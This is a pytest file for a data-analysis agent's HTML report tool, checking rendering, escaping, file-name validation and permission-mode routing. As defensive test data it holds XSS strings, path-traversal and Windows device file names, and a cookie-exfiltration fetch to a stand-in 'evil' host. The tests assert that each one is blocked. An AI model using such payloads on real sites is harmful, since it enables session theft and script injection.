"""Tests for HtmlReportTool: rendering, escaping, path safety, and the seam."""

from typing import Any

from data_analysis_agent.agent_loop import AgentLoop, AgentLoopConfig
from data_analysis_agent.events import ToolResultEvent
from data_analysis_agent.protocol.messages import ModelResponse, TextBlock, ToolUseBlock
from data_analysis_agent.skills.builtin import ReportGenerationSkill
from data_analysis_agent.skills.registry import SkillRegistry
from data_analysis_agent.tools.html_report import (
    DEFAULT_ECHARTS_SRC,
    MAX_TABLE_ROWS,
    HtmlReportTool,
)
from data_analysis_agent.tools.registry import ToolRegistry

_BASE_INPUT: dict[str, Any] = {
    "title": "销售分析报告",
    "subtitle": "2026 Q2",
    "summary": "整体增长 12%。\n\n华东区贡献最大。",
    "sections": [
        {
            "heading": "区域分布",
            "text": "华东区领先。",
            "chart": {
                "option": {
                    "xAxis": {"type": "category", "data": ["华东", "华北"]},
                    "yAxis": {"type": "value"},
                    "series": [{"type": "bar", "data": [120, 80]}],
                },
                "caption": "区域销售额",
            },
        },
        {
            "heading": "Top 客户",
            "table": {"columns": ["客户", "金额"], "rows": [["A", 10], ["B", 8]]},
        },
    ],
}


def _input(**overrides: Any) -> dict[str, Any]:
    data = dict(_BASE_INPUT)
    data.update(overrides)
    return data


# --- validation -------------------------------------------------------------


def test_validation_requires_title_and_sections(tmp_path):
    tool = HtmlReportTool(artifact_dir=tmp_path)
    assert tool.validate_input({"sections": [{"heading": "x"}]}).valid is False
    assert tool.validate_input({"title": "t"}).valid is False
    assert tool.validate_input({"title": "t", "sections": []}).valid is False
    assert tool.validate_input(_input()).valid is True


def test_validation_rejects_bad_chart_and_height(tmp_path):
    tool = HtmlReportTool(artifact_dir=tmp_path)
    bad_option = _input(sections=[{"heading": "x", "chart": {"option": "not-a-dict"}}])
    assert tool.validate_input(bad_option).valid is False

    bad_height = _input(
        sections=[{"heading": "x", "chart": {"option": {"series": []}, "height": 5}}]
    )
    assert tool.validate_input(bad_height).valid is False


def test_validation_rejects_path_traversal_file_names(tmp_path):
    tool = HtmlReportTool(artifact_dir=tmp_path)
    for name in ("../evil.html", "a/b.html", ".hidden.html", ""):
        result = tool.validate_input(_input(file_name=name))
        assert result.valid is False, name
    assert tool.validate_input(_input(file_name="ok.html")).valid is True


# --- rendering --------------------------------------------------------------


async def test_report_written_into_artifact_dir(tmp_path):
    tool = HtmlReportTool(artifact_dir=tmp_path / "artifacts")
    result = await tool.call(_input(file_name="report.html"))

    assert result.is_error is False
    paths = result.metadata["artifact_paths"]
    assert len(paths) == 1
    page = (tmp_path / "artifacts" / "report.html").read_text(encoding="utf-8")
    assert "销售分析报告" in page
    assert '<div class="chart" id="chart_0"' in page
    assert 'render("chart_0"' in page
    assert DEFAULT_ECHARTS_SRC in page
    assert "<td>A</td>" in page  # table rendered


async def test_text_and_title_are_escaped(tmp_path):
    tool = HtmlReportTool(artifact_dir=tmp_path)
    evil = "<script>alert(1)</script>"
    result = await tool.call(
        _input(
            title=f"T {evil}",
            summary=evil,
            sections=[{"heading": evil, "text": evil}],
            file_name="r.html",
        )
    )
    assert result.is_error is False
    page = (tmp_path / "r.html").read_text(encoding="utf-8")
    assert "<script>alert(1)</script>" not in page
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in page


async def test_chart_option_strings_cannot_break_out_of_script(tmp_path):
    tool = HtmlReportTool(artifact_dir=tmp_path)
    option = {"title": {"text": "</script><script>alert(1)</script>"}, "series": []}
    result = await tool.call(
        _input(sections=[{"heading": "x", "chart": {"option": option}}], file_name="r.html")
    )
    assert result.is_error is False
    page = (tmp_path / "r.html").read_text(encoding="utf-8")
    assert "</script><script>alert(1)" not in page
    assert "<\\/script>" in page  # escaped form survives


async def test_table_truncation_note(tmp_path):
    tool = HtmlReportTool(artifact_dir=tmp_path)
    rows = [[i] for i in range(MAX_TABLE_ROWS + 50)]
    result = await tool.call(
        _input(
            sections=[{"heading": "x", "table": {"columns": ["n"], "rows": rows}}],
            file_name="r.html",
        )
    )
    assert result.is_error is False
    page = (tmp_path / "r.html").read_text(encoding="utf-8")
    assert f"仅展示前 {MAX_TABLE_ROWS} 行" in page
    assert f"共 {MAX_TABLE_ROWS + 50} 行" in page


async def test_no_echarts_tag_when_report_has_no_charts(tmp_path):
    tool = HtmlReportTool(artifact_dir=tmp_path)
    result = await tool.call(
        _input(sections=[{"heading": "纯文本", "text": "无图"}], file_name="r.html")
    )
    assert result.is_error is False
    page = (tmp_path / "r.html").read_text(encoding="utf-8")
    assert "<script" not in page  # no ECharts load, no init script


async def test_local_echarts_source_is_inlined(tmp_path):
    js = tmp_path / "echarts.min.js"
    js.write_text("window.echarts = { init: function () {} };", encoding="utf-8")
    tool = HtmlReportTool(artifact_dir=tmp_path / "out", echarts_src=str(js))
    result = await tool.call(_input(file_name="r.html"))
    assert result.is_error is False
    page = (tmp_path / "out" / "r.html").read_text(encoding="utf-8")
    assert "window.echarts" in page  # inlined
    assert DEFAULT_ECHARTS_SRC not in page


async def test_missing_local_echarts_falls_back_to_cdn(tmp_path):
    tool = HtmlReportTool(artifact_dir=tmp_path, echarts_src=str(tmp_path / "missing.js"))
    result = await tool.call(_input(file_name="r.html"))
    assert result.is_error is False
    page = (tmp_path / "r.html").read_text(encoding="utf-8")
    assert DEFAULT_ECHARTS_SRC in page


async def test_non_echarts_local_file_not_inlined(tmp_path):
    """A local echarts_src pointing at a non-echarts file is NOT inlined (would
    inject arbitrary JS into every delivered report); falls back to the CDN."""
    fake = tmp_path / "evil.js"
    fake.write_text("fetch('//evil/?c='+document.cookie)", encoding="utf-8")
    tool = HtmlReportTool(artifact_dir=tmp_path / "out", echarts_src=str(fake))
    result = await tool.call(_input(file_name="r.html"))
    assert result.is_error is False
    page = (tmp_path / "out" / "r.html").read_text(encoding="utf-8")
    assert "fetch('//evil" not in page  # arbitrary payload NOT inlined
    assert DEFAULT_ECHARTS_SRC in page  # fell back to CDN


# --- seam + routing ---------------------------------------------------------


class _SequenceClient:
    model = "dummy"

    def __init__(self, responses):
        self.responses = list(responses)

    async def stream_model(
        self, messages, system=None, tools=None, max_tokens=None, tool_choice=None
    ):
        response = self.responses.pop(0)
        for block in response.content:
            yield block
        yield response


async def test_agent_loop_surfaces_report_artifact(tmp_path):
    registry = ToolRegistry()
    registry.register(HtmlReportTool(artifact_dir=tmp_path / "artifacts"))
    client = _SequenceClient(
        [
            ModelResponse(
                content=[
                    ToolUseBlock(
                        id="tu_rep",
                        name="html_report",
                        input=_input(file_name="report.html"),
                    )
                ],
                stop_reason="tool_use",
            ),
            ModelResponse(content=[TextBlock("done")], stop_reason="end_turn"),
        ]
    )
    agent = AgentLoop(AgentLoopConfig(api_key="test"), registry, client=client)

    events = [event async for event in agent.run("出报告")]
    result = next(e for e in events if isinstance(e, ToolResultEvent))

    assert len(result.artifacts) == 1
    assert result.artifacts[0].endswith("report.html")
    assert "[产物已保存" in result.content


def test_report_skill_routing():
    skills = SkillRegistry()
    skills.register(ReportGenerationSkill())
    for query in ("生成可视化分析报告", "把结果做成 html 报告", "produce an html report"):
        matched = skills.match_best(query)
        assert matched is not None and matched.name == "report_generation", query


def test_plan_mode_denies_html_report():
    from data_analysis_agent.__main__ import build_registry
    from data_analysis_agent.config import AgentConfig

    config = AgentConfig()
    config.permission_mode = "plan"
    registry = build_registry(config)
    assert "html_report" not in [t.name for t in registry.assemble_tool_pool()]


async def test_js_line_terminators_are_escaped(tmp_path):
    """R1-M1 regression: U+2028/U+2029 in option strings must not reach the
    inline script raw (they are line terminators pre-ES2019)."""
    tool = HtmlReportTool(artifact_dir=tmp_path)
    option = {"title": {"text": "a\u2028b\u2029c"}, "series": []}
    result = await tool.call(
        _input(sections=[{"heading": "x", "chart": {"option": option}}], file_name="r.html")
    )
    assert result.is_error is False
    page = (tmp_path / "r.html").read_text(encoding="utf-8")
    assert "\u2028" not in page and "\u2029" not in page
    assert "\\u2028" in page and "\\u2029" in page


def test_validation_rejects_nul_in_file_name(tmp_path):
    """R1-M2 regression: NUL must fail validation, not blow up at resolve()."""
    tool = HtmlReportTool(artifact_dir=tmp_path)
    assert tool.validate_input(_input(file_name="a\x00.html")).valid is False


def test_validation_rejects_ragged_table(tmp_path):
    """R1-N1 regression: row width must match column count."""
    tool = HtmlReportTool(artifact_dir=tmp_path)
    bad = _input(
        sections=[{"heading": "x", "table": {"columns": ["a", "b"], "rows": [[1, 2], [3]]}}]
    )
    result = tool.validate_input(bad)
    assert result.valid is False
    assert "cells" in result.error


def test_auto_mode_keeps_html_report_available():
    from data_analysis_agent.__main__ import build_registry
    from data_analysis_agent.config import AgentConfig

    config = AgentConfig()
    config.permission_mode = "auto"
    registry = build_registry(config)
    assert "html_report" in [t.name for t in registry.assemble_tool_pool()]


def test_validation_rejects_windows_hostile_file_names(tmp_path):
    """R2-m2 regression: reserved device names and trailing dot/space."""
    tool = HtmlReportTool(artifact_dir=tmp_path)
    for name in ("CON", "con.html", "PRN.html", "report.html.", "report.html "):
        assert tool.validate_input(_input(file_name=name)).valid is False, name
    assert tool.validate_input(_input(file_name="console.html")).valid is True


def test_validation_rejects_embedded_space_device_name(tmp_path):
    """R3-M1 regression: 'con .html' must still be caught (Windows trims it)."""
    tool = HtmlReportTool(artifact_dir=tmp_path)
    assert tool.validate_input(_input(file_name="con .html")).valid is False
    assert tool.validate_input(_input(file_name="console .html")).valid is True


async def test_blank_summary_renders_no_card(tmp_path):
    """R3-M2 regression: whitespace-only summary must not emit an empty card."""
    tool = HtmlReportTool(artifact_dir=tmp_path)
    result = await tool.call(_input(summary="   \n\n  ", file_name="r.html"))
    assert result.is_error is False
    page = (tmp_path / "r.html").read_text(encoding="utf-8")
    assert "card summary" not in page
